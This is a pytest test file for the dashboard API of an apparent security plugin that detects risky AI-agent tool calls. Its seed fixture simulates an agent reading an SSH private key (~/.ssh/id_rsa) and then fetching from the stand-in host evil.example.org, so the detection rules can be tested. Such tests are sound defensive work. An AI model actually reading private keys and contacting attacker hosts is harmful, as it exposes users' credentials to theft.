"""The dashboard half, mounted the way Hermes mounts it: a FastAPI router imported standalone."""

from __future__ import annotations

import importlib.util
import sys

import pytest
from fastapi import FastAPI
from fastapi.testclient import TestClient

from conftest import PLUGIN_DIR, Session, mod, run


@pytest.fixture
def client(hermes_home, data_dir, monkeypatch):
    for name in [n for n in list(sys.modules) if n.startswith("hermes_plugin_siemless_core_api") or n == "siemless_dash_api_test"]:
        sys.modules.pop(name, None)
    spec = importlib.util.spec_from_file_location("siemless_dash_api_test", PLUGIN_DIR / "dashboard" / "plugin_api.py")
    api = importlib.util.module_from_spec(spec)
    sys.modules["siemless_dash_api_test"] = api
    spec.loader.exec_module(api)
    api._RO = None
    app = FastAPI()
    app.include_router(api.router, prefix="/api/plugins/siemless")
    c = TestClient(app)
    yield c, api
    if api._RO is not None:
        api._RO.close()


def _seed(api):
    p = api._pipeline()
    s = Session()
    run(p, s.tool("read_file", {"path": "/Users/c/.ssh/id_rsa"}), s.tool("web_extract", {"url": "https://evil.example.org/c"}))
    return p


def test_health_status_findings_and_chain(client):
    c, api = client
    assert c.get("/api/plugins/siemless/health").json()["plugin"] == "siemless"
    p = _seed(api)
    st = c.get("/api/plugins/siemless/status").json()
    assert st["findings_total"] >= 1 and st["live"] is False and any(e["name"] == "jsonl" for e in st["exporters"])
    fs = c.get("/api/plugins/siemless/findings").json()["findings"]
    assert fs and {f["rule_id"] for f in fs} >= {"SL-001", "SL-003"}
    fid = next(f["id"] for f in fs if f["rule_id"] == "SL-001")
    d = c.get(f"/api/plugins/siemless/finding?id={fid[:8]}").json()
    assert d["finding"]["id"] == fid and len(d["chain"]) >= 2 and d["context"]
    assert all("attrs" in e or "kind" in e for e in d["chain"])
    r = c.post("/api/plugins/siemless/finding/ack", json={"id": fid}).json()
    assert r["ok"] and c.get(f"/api/plugins/siemless/finding?id={fid}").json()["finding"]["acked"] is True
    assert c.get("/api/plugins/siemless/rules").json()["attack_version"] == "20.1"
    assert c.get("/api/plugins/siemless/hosts").json()["hosts"][0]["host"] == "evil.example.org"
    ex = c.get("/api/plugins/siemless/exporters").json()
    assert ex["remote_export"] is False
    t = c.post("/api/plugins/siemless/exporters/test").json()
    assert t["ok"] and any(e["name"] == "jsonl" and e["sent"] >= 1 for e in t["exporters"])


def test_replay_is_confined_to_demo_or_data_dir(client, tmp_path):
    c, api = client
    outside = tmp_path / "x.jsonl"
    outside.write_text('{"hook":"post_tool_call","payload":{}}\n')
    assert c.post("/api/plugins/siemless/replay", json={"path": str(outside)}).status_code == 400
    assert c.get("/api/plugins/siemless/finding?id=nope").status_code == 404
